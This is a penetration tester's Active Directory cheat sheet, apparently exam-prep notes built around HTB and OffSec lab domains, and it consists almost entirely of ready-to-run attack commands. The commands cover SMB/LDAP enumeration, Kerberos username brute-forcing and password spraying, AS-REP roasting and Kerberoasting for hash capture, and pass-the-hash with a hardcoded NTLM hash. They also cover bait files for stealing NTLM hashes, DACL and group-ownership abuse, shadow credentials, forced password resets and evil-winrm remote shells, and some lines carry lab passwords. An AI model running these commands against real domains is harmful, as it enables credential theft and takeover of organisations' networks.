## AD Checklist - Remote Enumeration

Run through all of the relevant ports' mds. All privilege escalation and local enumeration is is windows-enumeration.md.

sprayhound

https://github.com/lkarlslund/Adalanche/releases

```bash
nxc smb 192.168.32.0/24
source /opt/setenv.sh ip domain dc # user pass
sudo ntpdate -u $ip && date # (host) sudo service vboxadd-service stop -> sudo rdate -n $dcip, timedatectl set-ntp 0 (for troubleshooting)

/opt/nmap.sh -H $ip -t All
mkdir nmap; sudo nmap -s -p- 192.168.32.0/24 -oA nmap/sweep.nmap -T4
/opt/nmap.sh 192.168.32.10-12
nmap -Pn -p- -sC -sV -oA full_scan 192.168.32.10-12

nslookup -type=srv _ldap._tcp.dc._msdcs.$dom $ip
python /opt/evil-winrm-krb-configurator.py $dom DC01

sudo autorecon $ip --subdomain-enum.domain $dom --global.domain $dom

enum4linux -a $ip
enum4linux -a -M -l -d $ip 2>&1
enum4linux -a -u "$dom\\$user" -p $pass $ip
enum4linux -a -u "$dom\\$user" -p "" -M -l -d $ip 2>&1
enum4linux -a -u "" -p "" $ip && enum4linux -a -u "guest" -p "" $ip
enum4linux -a -M -l -d $dom 2>&1 && enum4linux-ng $dom -A -C
enum4linux -a -u "" -p "" $ip && enum4linux -a -u "guest" -p "" $ip
enum4linux -a -u "$dom\\$user" -M -l -d $dom 2>&1 && enum4linux-ng $dom -u $user -p $pass -A -C

enum4linux-ng $ip
enum4linux-ng $ip -A -C
enum4linux-ng $ip -u $user -p $pass -oY out

smbclient -L //$ip
smbclient -N -L //$ip
smbclient -L //$ip -N


nxc smb $ip -u 'a' -p '' --shares
nxc smb $ip -u 'a' -p '' --all
nxc smb $ip -u 'guest' -p '' --shares
nxc smb $ip -u 'administrator' -p 'fake' --shares
nxc smb $ip -u '' -p 'fake' --shares
nxc smb $ip -u users.txt -p users.txt --no-bruteforce --continue-on-success
nxc smb $ip -u ‘guest’ -p ‘’ --rid-brute # If IPC$ is readable
nxc smb $ip -u ‘guest’ -p ‘’ --rid-brute > u.txt

smbmap -u "" -p "" -P 445 -H $ip && smbmap -u "guest" -p "" -P 445 -H $ip
smbclient -U '%' -L //$ip && smbclient -U 'guest%' -L //
smbclient —kerberos //$dc/share
smbclient.py -k @braavos.essos.local
smbclient.py -k -no-pass @winterfell.north.sevenkingdoms.local
python /opt/ntlm_theft/ntlm_theft.py -g all -s $myip -f test # Create a bunch of clickable links to get ntlm when you can put in shared

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='$dom',userdb=users.txt" $ip # Kerberos users
getTGT.py $dom/$user:$pass # -dc-ip $dc
getTGT.py $dom/Administrator -dc-ip $dc -hashes aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051
KRB5CCNAME=/home/kali/htb/absolute/d.klay.ccache nxc smb $ip -u $user -p $pass -k

nxc smb $ip -d $dom -u 'a' -p '' -M enum_dns

rpcclient -U $user $ip 
rpcclient $ip -N -U ""
rpcclient -U "$dom\\" $ip -N

python /opt/ridenum.py $ip 500 2000
samrdump.py $dom/$user:$pass@$ip

# Check if password policy was manually made easier, hidden passwords
ldapsearch -x -h $ip -s base # null bind connection
ldapsearch -x -H ldap://$ip
ldapsearch -x -H ldap://$ip -s base namingcontexts
ldapsearch -x -H ldap://$ip -b "DC=,DC="
ldapsearch -x -H ldap://$ip -b "DC=,DC=" '(objectClass=Person)'
ldapsearch -x -H ldap://$ip -b "DC=,DC=" '(objectClass=Person)' sAMAccountName sAMAccountType
ldapsearch -x -H ldap://$ip -b "DC=DomainDnsZones,DC=,DC="
ldapsearch -H ldap://$ip -D "$user@$dom" -w "$pass" -b 'dc=,dc='
ldapsearch -x -H ldap://$ip -b "DC=,DC=" | grep -vi "objectClass\|distinguishedName\|instanceType\|whenCreated\|whenChanged\|uSNCreated\|uSNChanged\|objectGUID\|userAccountControl\|codePage\|countryCode\|objectSid\|accountExpires\|sAMAccountType\|isCriticalSystemObject\|dSCorePropagationData\|lastLogonTimestamp\|showInAdvancedViewOnly\|groupType\|msDS-SupportedEncryptionTypes:\|lastLogoff\|badPasswordTime\|ref:\|#\ num\|#\ search\|search:\|result:" | grep -i "pass\|pwd"
ldapsearch -x -H ldap://$ip -b "DC=,DC=" '(objectClass=Person)' | grep -vi "objectClass\|distinguishedName\|instanceType\|whenCreated\|whenChanged\|uSNCreated\|uSNChanged\|objectGUID\|userAccountControl\|codePage\|countryCode\|objectSid\|accountExpires\|sAMAccountType\|isCriticalSystemObject\|dSCorePropagationData\|lastLogonTimestamp\|showInAdvancedViewOnly\|groupType\|msDS-SupportedEncryptionTypes:\|lastLogoff\|badPasswordTime\|ref:\|#\ num\|#\ search\|search:\|result:"
ldapsearch -x -H ldap://$ip -b "DC=,DC=" '(objectClass=Person)' | grep -vi "objectClass\|distinguishedName\|instanceType\|whenCreated\|whenChanged\|uSNCreated\|uSNChanged\|objectGUID\|userAccountControl\|codePage\|countryCode\|objectSid\|accountExpires\|sAMAccountType\|isCriticalSystemObject\|dSCorePropagationData\|lastLogonTimestamp\|showInAdvancedViewOnly\|groupType\|msDS-SupportedEncryptionTypes:\|lastLogoff\|badPasswordTime\|ref:\|#\ num\|#\ search\|search:\|result:" | grep -i "pass\|pwd"
ldapsearch -LLL -x -H ldap://$ip -b'DC=absolute,DC=htb' -s base '(objectclass=\*)'

# Automates the above
/opt/ldappy.sh $ip -u $user -p $pass -d $dom

/opt/legba/legba ldap --target $ip:389 --username administrator --password custom-passwords.txt --ldap-domain $dom --single-match
ldapdomaindump $dom --no-json --no-html
ldapdomaindump $ip -u "$dom\\$user" -p $pass --no-json --no-grep [--authtype SIMPLE]
/opt/ldapper -D $dom -U $user -P $pass -S $ip -m 0  -s '(cn=*)' cn
python ldapper.py -D 'domain' -U 'user' -P 'pass' --server $dom --maxrecords 0 --search 1 | grep samaccountname | awk -F':' '{print $2}' > usernames.txt
bloodhound-python -d $dom -v --zip -c All -dc $ip -ns $ip
bloodhound-python -u $user -p $pass -d $dom -v --zip -c All -dc $dc -ns $ip
bloodhound-python -u $user -p $pass -k -d $dom -dc $dc -c ALL --zip
bloodhound-python -u $user -p $pass -k -d $dom -dc $dc -c ALL -ns $ip --zip
ldeep cache -d "$dom" -p "$dom" trusts
ldeep ldap -u $user -p $pass -d $dom -s ldap://$dom add_to_group "CN=TRACY WHITE,OU=STAFF,DC=NARA-SECURITY,DC=COM" "CN=REMOTE ACCESS,OU=remote,DC=NARA-SECURITY,DC=COM" # Then try evil-winrm

# If you attempt to authenticate to an AD server via Kerberos, it's going to say 'hey, continue with pre-authentication'. It doesn't do that with invalid names.
/opt/kerbrute userenum usernames.txt -d "$dom" --dc $ip
/opt/kerbrute userenum -d $dom --dc $ip /opt/SecLists/Usernames/xato-net-10-million-usernames-dup-lowercase.txt -t 100
/opt/kerbrute userenum -d $dom --dc $ip /opt/SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt -t 100
/opt/kerbrute userenum -d $dom --dc $ip custom-wordlist.txt -t 100
cewl -g --with-numbers -d 20 $url |grep -v CeWL > custom-wordlist.txt
hashcat --stdout -a 0 -r /usr/share/hashcat/rules/best64.rule custom-wordlist.txt >> custom-passwords.txt
awk 'NR==FNR {a[$1]; next} {for (i in a) print $1 ":" i}' custom-passwords.txt users.txt > combined.txt
/opt/kerbrute bruteuser -d $dom custom-passwords.txt administrator --dc $ip
for i in $(cat users.txt); do echo "$i:$i" >> combo.txt; done
/opt/kerbrute bruteforce combo.txt -d $dom --dc $ip
/opt/kerbrute passwordspray -d $dom --dc $ip users.txt $pass

psexec.py

impacket-GetADUsers -dc-ip $ip "$dom/" -all
impacket-GetADUsers -dc-ip $ip $dom/$user:$pass -all

# Even if you don't have a password, use their username to auth
GetNPUsers.py -request -format hashcat -outputfile asrep.txt "$dom/$user"
for u in $(cat users.txt); do GetNPUsers.py -request -format hashcat -outputfile asrep.txt "$dom/$u"; wait; done
GetNPUsers.py -request -format hashcat -outputfile asrep.txt -dc-ip $ip "$dom/"
GetNPUsers.py -request -format hashcat -outputfile asrep.txt -dc-ip $ip $dom/$user:$pass
GetNPUsers.py $dom/ -dc-ip $ip -usersfile users.txt -format hashcat -outputfile hashes.txt

impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip $ip "$dom/"
impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip $ip "$dom"/"$user":"$pass"

/opt/windows/nxc.sh $ip

sudo cp /etc/krb5.conf /etc/krb5user.bak
python /opt/evil-winrm-krb-configurator.py $dom dc
export KRB5_CONFIG=/etc/krb5.conf
export KRB5CCNAME=/tmp/krb5cc_1000
kinit d.klay@ABSOLUTE.HTB
klist

impacket-mssqlclient $user:$pass@$ip -windows-auth
impacket-mssqlclient $dom/$user:$pass@$ip -windows-auth
nxc mssql -d $dom -u $user -p $pass -x "whoami" 192.168.165.40 -q 'SELECT name FROM master.dbo.sysdatabases;'
nxc mssql -d $dom -u $user -p $pass -x "whoami" 192.168.165.40 -q 'use hrappdb; select * from hrappdb..sysobjects;' --port 58538 -M mssql_priv

source /opt/targetedKerberoast/venv/bin/activate
python /opt/targetedKerberoast/targetedKerberoast.py -d $dom -u $user -p $pass --dc-ip $ip
python /opt/targetedKerberoast/targetedKerberoast.py -d $dom -u $user -p $pass --dc-ip $ip -o kerberload.txt
python /opt/windows/targetedKerberoast/targetedKerberoast.py -d $dom -u $user -p $pass --dc-ip $ip

python /opt/windows/bloodyAD/bloodyAD.py --host $dc -d $dom -u $user -p $pass -k get writable --right WRITE --detail
python /opt/windows/bloodyAD/bloodyAD.py --host $ip -d $dom -u $user -p $pass get writable --otype USER --right WRITE --detail | egrep -i 'distinguishedName|servicePrincipalName' # Check for interesting permissions on accounts:
python /opt/windows/bloodyAD/bloodyAD.py --host $ip -d $dom -u $user -p $pass get object $user --attr servicePrincipalName # Check if current user has already an SPN setted:
python /opt/windows/bloodyAD/bloodyAD.py --host $ip -d $dom -u $user -p $pass set object servicePrincipalName $target -v 'ops/whatever1' # Force set the SPN on the account: Targeted Kerberoasting
impacket-GetUserSPNs -dc-ip $ip "$dom/$user:$pass" -request-user "target" # Grab the ticket
python /opt/windows/bloodyAD/bloodyAD.py --host $ip -d $dom -u $user -p $pass set object $user servicePrincipalName # Grab the ticket
python /opt/windows/bloodyAD/bloodyAD.py --host $ip -d $dom -u $user -p $pass set password 'iain.white' "$pass" # GenericAll or GenericWrite

If you own a Group, you can add your own attributes, such as AddMember privilege. Ensure that you are a part of that group at some point as this isnt always the case.
owneredit.py "$dom"/"$user":"$pass" -k -action write -new-owner "$user" -target-dn 'DC=ABSOLUTE,DC=HTB' -target "NETWORK AUDIT" -dc-ip $ip # writeowner on group trust abuse, genie granting himself unlimited wishes
dacledit.py "$dom"/"$user":"$pass" -k -action write -target-dn 'DC=ABSOLUTE,DC=HTB' -dc-ip $ip  -principal "$user"-dc-ip $ip # grant ability to write new members, anything with group
dacledit.py "$dom"/"$user":"$pass" -k -action write -target-dn 'DC=ABSOLUTE,DC=HTB' -dc-ip $ip  -principal "$user"-dc-ip $ip # verify
python /opt/windows/bloodyAD/bloodyAD.py --host $dc -d $dom -u $user -p $pass -k add groupMember "S-1-5-21-4078382237-1492182817-2568127209-1119" "S-1-5-21-4078382237-1492182817-2568127209-1116" # add 1116 to 1119
python /opt/windows/bloodyAD/bloodyAD.py --host $dc -d $dom -u $user -p $pass -k get object "S-1-5-21-4078382237-1492182817-2568127209-1116" # verify 
net rpc group addmem "Network Audit" $user -U $dom/$user:$pass -S $dc
net rpc group members "Network Audit" -U $user -k -S $dc # verify
getTGT.py $dom/$user:$pass # -dc-ip $dc
export KRB5CCNAME=m.lovegod.ccache
python pywhisker.py -d $dom -u $user -k  -t "winrm_user" --action "add"  --dc-ip $ip
python /opt/PKINITtools/gettgtpkinit.py $dom/winrm_user -cert-pfx XprBXoPu.pfx -pfx-pass SYBO85IL98n9g0vAfoWm winrm.ccache
export KRB5CCNAME=winrm.ccache
evil-winrm -i $dc -r $dom

net rpc password $target 'Password123!' -U "$dom"/"$user"%"$pass" -S "$dc"

certipy-ad find -username $user@$dom -k -target $dc
certipy shadow auto -k -no-pass -u $dom/$user@$dc -dc-ip $ip -target $dc -account winrm_user
KRB5CCNAME=./winrm_user.ccache evil-winrm -i dc.absolute.htb -r absolute.ht

openssl pkcs12 -in file.pfx -out pub.pem -nokeys
openssl pkcs12 -in file.pfx -out priv.pem
evil-winrm -i $ip -P 5986 -c pub.pem -k priv.pem -S -r $dom

KRB5CCNAME=/home/kali/htb/absolute/svc_smb.ccache nxc ldap -u $user -p $pass -k -M adcs $dc
ldapsearch -H ldap://dc.absolute.htb -b "dc=absolute,dc=htb"

Invoke-adPEAS -Domain 'access.offsec' -Server 'dc.access.offsec' -Username 'access\svc_mssql' -Password 'trustno1' -Force
Invoke-ADEnum -AllEnum -Force
.\pingcastle.exe --healthcheck --user access\svc_mssql --password trustno1 --level Full

.\Seatbelt.exe -group=all
```

"https://www.thehacker.recipes/ad/movement/"